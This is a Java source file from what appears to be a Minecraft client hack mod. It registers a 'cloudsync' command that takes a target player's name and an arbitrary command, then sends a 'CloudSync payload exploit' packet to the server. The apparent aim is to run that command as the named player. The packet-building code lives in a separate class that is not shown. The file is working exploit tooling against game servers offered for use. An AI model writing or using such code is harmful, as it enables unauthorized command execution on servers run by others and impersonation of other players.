package dev.wrrulosdev.mcpclient.client.commands.cmd;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.suggestion.Suggestions;
import com.mojang.brigadier.suggestion.SuggestionsBuilder;
import dev.wrrulosdev.mcpclient.client.commands.Command;
import dev.wrrulosdev.mcpclient.client.constants.ClientConstants;
import dev.wrrulosdev.mcpclient.client.payloads.CloudSyncPayloadPacket;
import dev.wrrulosdev.mcpclient.client.utils.messages.Msg;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import java.util.Objects;
import java.util.concurrent.CompletableFuture;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

public class CloudSyncExploitCommand implements Command {

    /**
     * Registers the cloudsync command with the client command system.
     *
     * @return A LiteralArgumentBuilder that configures the cloudsync command.
     */
    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> register() {
        return literal("cloudsync")
            .executes(this::executeRoot)
            .then(argument("username", StringArgumentType.string())
                .suggests(this::suggestUsernames)
                .then(argument("command", StringArgumentType.greedyString())
                    .executes(this::executeEasyCommandBlocker)));
    }

    /**
     * Suggests usernames to the player based on the current input.
     * This method is used to provide autocomplete suggestions for valid player names.
     *
     * @param context The command context.
     * @param builder The SuggestionsBuilder used to provide suggestions.
     * @return A CompletableFuture containing the suggested usernames.
     */
    private CompletableFuture<Suggestions> suggestUsernames(CommandContext<FabricClientCommandSource> context, SuggestionsBuilder builder) {
        String input = builder.getRemaining().toLowerCase();
        MinecraftClient client = MinecraftClient.getInstance();

        if (client.getNetworkHandler() != null) {
            client.getNetworkHandler().getPlayerList().stream()
                .map(entry -> entry.getProfile().getName())
                .filter(Objects::nonNull)
                .filter(name -> name.toLowerCase().startsWith(input))
                .forEach(builder::suggest);
        }

        return builder.buildFuture();
    }

    /**
     * Provides usage instructions for the "cloudsync" command when it is executed without arguments.
     *
     * @param context The command context.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeRoot(CommandContext<FabricClientCommandSource> context) {
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&cUsage: /mcp cloudsync <username> <command>");
        return 0;
    }

    /**
     * Executes the CloudSync exploit payload by sending it to the server.
     * This method sends the CloudSyncPayloadPacket to the server with the provided username and command.
     *
     * @param context The command context.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeEasyCommandBlocker(CommandContext<FabricClientCommandSource> context) {
        String username = StringArgumentType.getString(context, "username");
        String command = StringArgumentType.getString(context, "command");
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&aSending the &fcloudsync &aPayload Exploit to the server...");
        CloudSyncPayloadPacket.send(username, command);
        return 0;
    }
}
